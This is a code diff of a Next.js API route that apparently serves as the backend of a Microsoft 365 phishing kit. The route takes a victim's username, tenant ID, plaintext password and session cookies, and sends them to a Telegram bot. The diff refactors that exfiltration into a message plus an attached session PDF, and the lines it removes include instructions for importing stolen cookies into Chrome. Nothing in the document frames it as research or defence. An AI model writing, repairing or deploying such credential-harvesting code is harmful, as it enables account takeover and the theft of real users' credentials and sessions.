@@ -1,8 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server'
 import { PDFDocument, StandardFonts, error, rgb } from 'pdf-lib'
-const FormData = require('form-data')
 
-// ✅ FIXED: Proper typing for PDF options
+
 interface PDFTextOptions {
   x: number
   y: number
@@ -86,6 +85,11 @@ function getClientIP(request: NextRequest): string {
 export async function POST(request: NextRequest) {
   try {
     const data = await request.json()
+
+if (data.session_update) {
+  console.log('🔄 Session update — skipping Telegram')
+  return NextResponse.json({ status: 'ok' })
+}
     const ip = getClientIP(request)  
     
     const tenantId = data.tenantId || data.tid || 'Unknown'
@@ -102,44 +106,63 @@ export async function POST(request: NextRequest) {
     )
     
     const alertText = `💀 *Microsoft 365 CAPTURED*\n\n⏰ *${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}*\n🌐 *IP:* \`${ip}\`\n\n👤 *User:* \`${userPrincipal}\`\n🏢 *Tenant ID:* \`${tenantId}\`\n🔐 *Password:* \`${data.password || 'N/A'}\`\n\n📊 *Cookies:* ${data.cookies ? `${(data.cookies.length / 1024).toFixed(1)}KB (${data.cookies.split(';').length} cookies)` : 'None'}\n🔗 *Domain:* \`${domain}\`\n💻 *UA:* ${request.headers.get('user-agent')?.substring(0, 100)}...\n\n📄 *Session PDF* → next`
-
-    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+// 🔹 Send message
+const msgRes = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
   method: 'POST',
   headers: { 'Content-Type': 'application/json' },
   body: JSON.stringify({
-    chat_id: process.env.TELEGRAM_CHAT_ID,
+    chat_id: process.env.TELEGRAM_CHAT_ID || '',
     text: alertText,
-    parse_mode: 'Markdown',
-    disable_web_page_preview: true
   }),
 })
-console.log('✅ Telegram: Capture sent')
-    
-    // PDF document
-    const formData = new FormData()
-    ;(formData as any).append('chat_id', process.env.TELEGRAM_CHAT_ID)
-    ;(formData as any).append('document', pdfBuffer, { 
-      filename: `msft_${tenantId}_${userPrincipal.replace(/[@.]/g, '_')}_${Date.now()}.pdf`, 
-      contentType: 'application/pdf' 
-    })
-    ;(formData as any).append('caption', `🔑 *Import:*\nChrome → F12 → Application → Cookies → Import\n\n*Target:* ${userPrincipal}`)
 
-    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendDocument`, {
-      method: 'POST',
-      body: formData,
-    })
+const msgJson = await msgRes.json()
+console.log('📨 sendMessage:', msgJson)
 
-    console.log('✅ Telegram: Capture sent')
+if (!msgJson.ok) {
+  throw new Error(`sendMessage failed: ${msgJson.description}`)
+}
 
-    return NextResponse.json({ 
-      status: 'captured ✅', 
-      message: 'Welcome to Microsoft 365!',
-      email: userPrincipal,
-      redirect: '/https://login.microsoftonline.com/'
-    })
 
-  } catch (error) {
-    console.error('❌ Capture error:', error)
-    return NextResponse.json({ status: 'captured ✅' }, { status: 200 })
+// 🔹 Send PDF
+const formData = new FormData()
+
+formData.append('chat_id', process.env.TELEGRAM_CHAT_ID || '')
+console.log('PDF size:', pdfBuffer?.length)
+const blob = new Blob([new Uint8Array(pdfBuffer)], {
+  type: 'application/pdf',
+})
+
+formData.append('document', blob, `capture_${Date.now()}.pdf`)
+
+const docRes = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendDocument`, {
+  method: 'POST',
+  body: formData,
+})
+
+const docJson = await docRes.json()
+console.log('📄 sendDocument:', docJson)
+
+if (!docJson.ok) {
+  throw new Error(`sendDocument failed: ${docJson.description}`)
+}
+} catch (error: unknown) {
+  if (error instanceof Error) {
+    console.error('❌ Capture error:', error.message)
+    return NextResponse.json(
+      { status: 'error', message: error.message },
+      { status: 500 }
+    )
   }
+
+  return NextResponse.json(
+    { status: 'error', message: 'Unknown error' },
+    { status: 500 }
+  )
+  }
+
+  return NextResponse.json(
+    { status: 'success', message: 'Capture recorded' },
+    { status: 200 }
+  )
 }
